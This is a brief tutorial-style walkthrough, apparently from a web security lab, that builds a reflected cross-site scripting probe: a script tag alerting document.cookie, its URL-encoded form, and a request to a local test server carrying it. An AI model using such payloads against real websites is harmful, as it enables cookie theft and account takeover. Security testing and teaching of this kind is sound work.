1. First construct a browser script and follow along with the process below.

<script>alert(document.cookie)</script>

2. Ensure brackets are encoded, i.e. "<" and ">" become "%3c" and "%3e" respectively.

%3cscript%3ealert(document.cookie)%3c/script%3e

3. Turn this script into a request by adding the website URL at the beginning.

127.0.0.1:3000/%3cscript%3ealert(document.cookie)%3c/script%3e
